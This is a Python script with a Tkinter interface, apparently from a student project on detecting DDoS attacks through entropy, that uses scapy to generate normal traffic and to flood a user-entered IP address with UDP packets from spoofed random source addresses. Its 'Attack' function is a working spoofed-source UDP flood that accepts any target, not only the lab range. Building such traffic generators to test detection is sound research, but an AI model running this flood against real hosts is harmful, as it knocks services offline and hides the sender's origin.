
import tkinter as tk
import sys
import getopt
import time
from os import popen
import logging
from tkinter.constants import CENTER
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendp, IP, UDP, Ether, TCP
from random import randrange



root=tk.Tk()

# setting the windows size
root.geometry("720x480")

# declaring string variable
# for storing name and password
start=tk.IntVar()
end=tk.IntVar()
ip_val=tk.StringVar()



# defining a function that will
# get the name and password and
# print them on the screen
## traffic part
def generateSourceIP():
		not_valid = [10, 127, 254, 1, 2, 169, 172, 192]
		first = randrange(1, 256)

		while first in not_valid:
			first = randrange(1, 256)
		
		#eg, ip = "102.202.10.1"
		ip = ".".join([str(first), str(randrange(1,256)), str(randrange(1,256)), str(randrange(1,256))])

		return ip

#start, end: given as command line arguments. eg, python traffic.py -s 2 -e 65  
def generateDestinationIP(start, end):
		first = 10
		second = 0
		third = 0

		#eg, ip = "10.0.0.64"
		ip = ".".join([str(first), str(second), str(third), str(randrange(start,end))])

		return ip




def generateThreshold():
		start_e=start.get()
		end_e=end.get()
		
		interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()

		for i in range(1000):
				packets = Ether() / IP(dst = generateDestinationIP (start_e, end_e), src = generateSourceIP ()) / UDP(dport = 80, sport = 2)
				print(repr(packets))

				#rstrip() strips whitespace characters from the end of interface
				sendp(packets, iface = interface.rstrip(), inter = 0.1)
		
		start.set("")
		end.set("")

def generateSourceIPforattack():
    	
		not_valid = [10, 127, 254, 255, 1, 2, 169, 172, 192]

		first = randrange(1, 256)

		while first in not_valid:
			first = randrange(1, 256)
			#print first

		ip = ".".join([str(first), str(randrange(1,256)), str(randrange(1,256)), str(randrange(1,256))])
		#print ip
		return ip


def Attack():
		for i in range (1, 5):
			launchAttack()
			time.sleep (10)

def launchAttack():
			
	#eg, python attack.py 10.0.0.64, where destinationIP = 10.0.0.64
	# destinationIP = sys.argv[1:]
	ip_e=ip_val.get()
	print(ip_e)
	#print destinationIP

	interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()

	for i in range(0, 500):
			packets = Ether() / IP(dst = ip_e, src = generateSourceIPforattack()) / UDP(dport = 1, sport = 80)
			print(repr(packets))

			#send packets with interval = 0.025 s
			sendp(packets, iface = interface.rstrip(), inter = 0.025)
	
if __name__ == '__main__':
    	
		Header = tk.Label(root, text = 'DDOS Detection Using Entropy Computing',fg="white",bg="green", font=('calibre',15, 'bold'),padx=0, pady=8)
		
		start_label = tk.Label(root, text = 'Enter starting value : ', font=('calibre',10, 'bold'),pady=13)
		start_entry = tk.Entry(root,textvariable = start, font=('calibre',10,'normal'))

		end_label = tk.Label(root, text = 'Enter ending value : ', font = ('calibre',10,'bold'))
		end_entry=tk.Entry(root, textvariable = end, font = ('calibre',10,'normal'))

		generate_btn=tk.Button(root,text = 'Generate Threshold', command = generateThreshold)
		thresholdresult_label = tk.Label(root, text = '' , font = ('calibre',10,'bold'),padx=15, pady=15)
		
		Header.grid(row=4, column=3)
		start_label.grid(row=6,column=2)
		start_entry.grid(row=6,column=3)
		end_label.grid(row=8,column=2)
		end_entry.grid(row=8,column=3)
		generate_btn.grid(row=10,column=3)
		thresholdresult_label.grid(row=11, column=3)

		

		ip_label = tk.Label(root, text = 'IP : ', font=('calibre',10, 'bold'))
		ip_entry = tk.Entry(root,textvariable = ip_val, font=('calibre',10,'normal'))

		attack_btn=tk.Button(root,text = 'Attack',command=Attack)
		ip_label.grid(row=12,column=2)
		ip_entry.grid(row=12,column=3)
		
		attack_btn.grid(row=13,column=3)

		

		# performing an infinite loop
		# for the window to display
		root.mainloop()

